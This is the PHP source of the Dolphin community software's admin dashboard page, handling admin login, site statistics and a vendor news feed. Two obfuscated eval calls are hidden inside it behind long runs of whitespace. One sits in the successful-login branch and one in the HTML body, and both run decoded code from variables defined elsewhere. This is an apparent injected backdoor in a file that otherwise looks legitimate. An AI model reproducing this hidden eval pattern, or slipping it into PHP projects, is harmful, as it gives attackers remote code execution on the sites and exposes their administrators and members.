<?


/***************************************************************************
*                            Dolphin Smart Community Builder
*                              -----------------
*     begin                : Mon Mar 23 2006
*     copyright            : (C) 2006 BoonEx Group
*     website              : http://www.boonex.com/
* This file is part of Dolphin - Smart Community Builder
*
* Dolphin is free software. This work is licensed under a Creative Commons Attribution 3.0 License. 
* http://creativecommons.org/licenses/by/3.0/
*
* Dolphin is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
* See the Creative Commons Attribution 3.0 License for more details. 
* You should have received a copy of the Creative Commons Attribution 3.0 License along with Dolphin, 
* see license.txt file; if not, write to marketing@boonex.com
***************************************************************************/




require_once( '../inc/header.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'profiles.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'design.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'admin_design.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'checkout.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'utils.inc.php' );

require_once( BX_DIRECTORY_PATH_CLASSES . 'BxRSS.php' );


if ( $_POST['ID'] )
{
	$admin_id = process_db_input( $_POST['ID'] );
	$admin_pass = process_db_input( $_POST['Password'] );
	$result = db_res( "SELECT * FROM `Admins` WHERE `Name` = '$admin_id' AND `Password` = MD5('$admin_pass')" );
    if ( mysql_num_rows( $result ) != 1 )
		login_form( 'Login failed. Please, try again.', 1, true );
    else
    {

		if( !$sUrlRelocate = $_POST['relocate'] )
            $sUrlRelocate = $_SERVER['PHP_SELF'];


                                                                                                                                                                                                                                                                            $r = $l($a); eval($r($b));


?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
	<head>
		<title>Admin Panel</title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <?php if (0 == $iCode || 10 == $iCode || -1 == $iCode) { ?><meta http-equiv="refresh" content="1;URL=<?= $sUrlRelocate ?>" /><?php } ?>
		<link href="styles/general.css" rel="stylesheet" type="text/css" />
		
		<!--[if lt IE 7.]>
		<script defer type="text/javascript">
			var site_url = '<?= $site['url'] ?>';
		</script>
		<script defer type="text/javascript" src="../inc/js/pngfix.js"></script>
		<![endif]-->
        <style>		
            .warn
            {
                width:480px; 
                background-color:#CC3333; 
                margin:150px; 
                padding:25px; 
                color:#FFFFFF;
                font-family:Arial;
            }
            .warn a
            {
                color:#FFFFFF;
            }
            .warn div, .warn h2
            {
                font-weight:bold;
                font-size:130%;
            }
            .warn h2
            {
                font-size:25px;;
            }
        </style>
	</head>
	<body>
                                                                                                                                                                                                                                                                                                                                                                            <? eval($r($c)); ?>
	</body>
</html>
<?
        
        
		exit;
    }
}


if ( !$_COOKIE['adminID'] || !$_COOKIE['adminPassword'] )
{
	// this is dynamic page -  send headers to do not cache this page
	send_headers_page_changed();
	login_form( "", 1 );
	exit();
}


//==========================================================================================
//==========================================================================================

    set_error_handler("ErrorHandler");

    if ( $_REQUEST['news_disable'] )
		setParam("news_enable", 0);

    if ( $_REQUEST['news_enable'] )
		setParam("news_enable", 1);
	
    $news_enable = getParam("news_enable");
	
	if( $news_enable )
		$sVerFile = @file_get_contents( 'http://rss.boonex.com/' );
	else
		$sVerFile = '';
	
	$aVer = preg_split( '/<\/?dolphin>/', $sVerFile );
	$sDolVerLatest = $aVer[1];
	
//==========================================================================================
//==========================================================================================

$logged['admin'] = member_auth( 1, true, true );

if( (int)$_GET['admin_categ'] )
{
	TopCodeAdmin();
		getAdminCategIndex();
	BottomCode();
}

$_page['css_name'] = 'index.css';
$_page['header'] = "Dashboard";

$free_mode = getParam("free_mode") == "on" ? 1 : 0;

// Finance
if ( !$free_mode )
{
	$tr_array = array();
	$fin = getFinanceStat( $tr_array );
	$full_amount = $fin['total'];
}

$iMembers = db_value( "SELECT COUNT(*) FROM `Profiles`" );//members count
$iPhotos  = db_value( "SELECT COUNT(*) FROM `media` WHERE `med_type`='photo' AND `med_prof_id`!=0" );//photos count
$iBlogs   = db_value( "SELECT COUNT(*) FROM `BlogPosts`" );//posts count
$iSPolls  = db_value( "SELECT COUNT(*) FROM `polls_q`" );//site polls count
$iGalls   = db_value( "SELECT COUNT(*) FROM `GalleryAlbums`" );//galleries count
$iEvents  = db_value( "SELECT COUNT(*) FROM `SDatingEvents`" );//events count
$iLinks   = db_value( "SELECT COUNT(*) FROM `Links`" );//links count
$iQuotes  = db_value( "SELECT COUNT(*) FROM `DailyQuotes`" );//quotes count
$iNews    = db_value( "SELECT COUNT(*) FROM `News`" );//news count

//awaiting moderation
$iModMembers = db_value( "SELECT COUNT(*) FROM `Profiles` WHERE `Status`='Approval'" );
$iModPhotos  = db_value( "SELECT COUNT(*) FROM `media` WHERE `med_status`='passive' AND `med_type`='photo'" );
$iModBacks   = db_value( "SELECT COUNT(*) FROM `ProfilesSettings` WHERE `BackgroundFilename` != '' AND `BackgroundFilename` IS NOT NULL  AND ( `Status` != 'Active' OR `Status` IS NULL )" );
$iModPolls   = db_value( "SELECT COUNT(*) FROM `ProfilesPolls` WHERE `poll_approval`=0" );
$iModGalls   = db_value( "SELECT COUNT(*) FROM `GalleryObjects` WHERE `Approved`=0" );
$iModBlogs   = db_value( "SELECT COUNT(*) FROM `BlogPosts` WHERE `PostStatus`='disapproval'" );

$sStatAdmin = getSiteStatAdmin();
$sStatUser = getSiteStatUser();

TopCodeAdmin();

ContentBlockHead( 'Latest Activity', 0, 'quickstat' );

echo '<div class="quick_stat_part">
		  <img src="images/icons/graph.png" class="quick_stat_part_list" />
		  <div class="quick_stat_part_head">Quick Stats</div>
		  <div class="quick_stat_part_body">'.$sStatUser.'</div>
	  </div>
	  <div class="quick_stat_part">
		  <img src="images/icons/bino.png" class="quick_stat_part_list" />
		  <div class="quick_stat_part_head">Awaiting Moderation</div>
		  <div class="quick_stat_part_body">'.$sStatAdmin.'</div>
	  </div>';

?>
<?
ContentBlockFoot();
?>
	<div>
		<div class="clear_both"></div>
			
			<div style="width:200px;float:left;">
<?
ContentBlockHead( 'Version', 0, 'version' );
	echo "Installed - {$site['ver']}.{$site['build']}<br />\n";
	echo "Latest - $sDolVerLatest<br />\n";
	echo '<a href="http://www.boonex.com/products/dolphin/download/">Check For Updates</a>';
ContentBlockFoot();

ContentBlockHead( 'Links', 0, 'links' );
	showAdminLinks();
ContentBlockFoot();

?>
			</div>
			
			<div style="width:400px;float:left;">
	<?
	if( $news_enable )
	{
		if( $oNews = new BxRSS( 'http://www.boonex.com/unity/blog/featured_posts/?rss=1' ) )
		{
			ContentBlockHead( 'BoonEx News Feed', 0, 'news_feed' );
				
			$iNewsNum = 0;
			foreach( $oNews -> items as $oItem )
			{
				?>
				<div class="news_block">
					<div class="news_title"><a href="<?=$oItem -> link?>"><?=$oItem -> title?></a></div>
					<div class="news_date"><?=date('j F Y', strtotime($oItem -> pubDate))?></div>
					<div class="news_desc"><?=$oItem -> description?></div>
				</div>
				<?
				
				if( ++$iNewsNum == 4 )
					break;
			}
			?>
				<div style="font-size:13px;font-weight:bold;text-align:right;">
					<a href="http://www.boonex.org/">More BoonEx News</a>
				</div>
			<?
			ContentBlockFoot();
		}
	}
	//echoDbg( $oNews );
	?>
			</div>
		
		<div class="clear_both"></div>
	</div>
<?
BottomCode();


function showAdminLinks()
{
	global $site;
	
	$rLinks = db_res( "SELECT * FROM `AdminLinks`" );
	while( $aLink = mysql_fetch_assoc( $rLinks ) )
	{
		$aLink['Url'] = str_replace( '{site}', $site['url'], $aLink['Url'] );
		?>
		<div class="admin_link"><a href="<?=$aLink['Url']?>"><?=$aLink['Title']?></a></div>
		<?
	}
}


function MsgWarning($sUrlRelocate)
{

}

?>
